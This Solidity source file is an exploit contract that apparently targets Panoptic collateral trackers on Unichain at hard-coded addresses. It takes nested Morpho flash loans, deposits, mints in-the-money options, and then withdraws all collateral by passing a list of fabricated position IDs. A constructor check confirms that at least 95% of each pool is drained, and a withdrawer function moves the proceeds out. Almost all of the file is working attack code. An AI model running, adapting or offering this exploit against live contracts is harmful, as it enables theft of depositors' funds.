// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract ETH_USDC5bpsUnichainAttacker_Deployer {
    ETH_USDC5bpsUnichainAttacker public attacker;
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);
    IERC20Partial token1 = IERC20Partial(address(0x078D782b760474a361dDA0AF3839290b0EF57AD6)); // usdc
    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0xb3DeeEE00B28b27845E410D8e8e141F0A0A7d87F));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xf40BaA5F85e8CeD1a1dd2d92055C06469965469E));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new ETH_USDC5bpsUnichainAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = WETH.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract ETH_USDC5bpsUnichainAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [16993655162578412, 17009206836208441, 16939609024273842, 17133860513315788, 16898430492320797, 17101708812844843, 17069357979992109, 17086352299123725, 17026674622507335, 17154261232855203, 17082751614160489, 16905884702516433, 17034803466092545, 16985606900097701, 17114928340284497, 16942964596981210, 17025612530710537, 16889820611195521, 16949521359855531, 16920216715452750, 17129587578817479, 16988002051593903, 17126645520732798, 17074540876198711, 17119951603807036, 17119329401324348, 17036991767596593, 17122846506677707, 17018492495701600, 16999873957325411, 17097995700960721, 16997018527186481, 17024105470881979, 17073996118339521, 17036439949713896, 16890488824791009, 16989089162921432, 17060011233606751, 17003020264083211, 17066233128463852, 16941005867879549, 17067919565309087, 17103589480369901, 17008221870292762, 16989238486935005, 17126049222761791, 17101150678162124, 16927713925256617, 16894635486029112, 16923138720850302, 16992821954860765, 17027825720482802, 17038739514264792, 17140497124282292, 17100042690718021, 16969369082248421, 16905463410247128, 17005578710070990, 17074313683106350, 17038292193577029, 17130759040409663, 16908625724213635, 17166195869489409, 17101208203141327, 17138198303696334, 16908147932247101, 16894658434788774, 16938993875545352, 17072849265831395, 17075863080850773, 17017661774688634, 16908153974732775, 16988465729292003, 17014445553286162, 16974767401004252, 16899543848560918, 16894355756410939, 17119602343874712, 16967923632426531, 16908893219668699, 16895531852075711, 17129841125473381, 17153702279128601, 17021555222469713, 17020691157262149, 16897926812058864, 17122672512185594, 16992035341009344, 17045419378318324, 16946829128487768, 17050277920000050, 17146520609095429, 17032253897074887, 16972156248137231, 16907480429887088, 16962955384487272, 16934457177659003, 17016931853357540, 17072588196537057, 16998536847852287, 16935870331365850, 17128654064464828, 17029938928325889, 17022423542452956, 17094514593261230, 16957874886315994, 17106588479166820, 17029198303267245, 17004523319620584, 17123055963217059, 17050369048063491, 16947327288449607, 17029065097821193, 16996711919775464, 17057227897167136, 16913491436315882, 16944179477276374, 16919590554483084, 17167047696388934, 17157376839885919, 16953408099015714, 17061718554541272, 17161081997515482, 16936365070053071, 17025796118226330, 17057008683916553, 17087643854683771, 16991286763756420, 17094346387673542, 16943603167087332, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On unichain
    address token0 = address(0); // native eth
    IERC20Partial token1 = IERC20Partial(address(0x078D782b760474a361dDA0AF3839290b0EF57AD6)); // usdc
    IMorpho morpho = IMorpho(address(0x8f5ae9CddB9f68de460C77730b018Ae7E04a140A));

    // Need this for flash loaning:
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);

    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0xb3DeeEE00B28b27845E410D8e8e141F0A0A7d87F));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xf40BaA5F85e8CeD1a1dd2d92055C06469965469E));
    IPanopticPool_v4 pp = IPanopticPool_v4(address(0x000003493cb99a8C1E4F103D2b6333E4d195DF7d));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            // passing in WETH, not token0, as the asset to borrow, as token0 is ETH which is not flash-loanable
            morpho.flashLoan(address(WETH), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            WETH.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        WETH.withdraw(attackAmount0);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit{value: attackAmount0}(uint128(attackAmount0), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283210603195836152281);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283210603195836152281);
        posIdList2[1] = TokenId.wrap(2560008631394908879028247869913);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList, false);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList, false);

        // Re-wrap the WETH to ultimately pay back the flash loan + keep profits in WETH, not ETH
        WETH.deposit{value: toWithdraw0}();

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
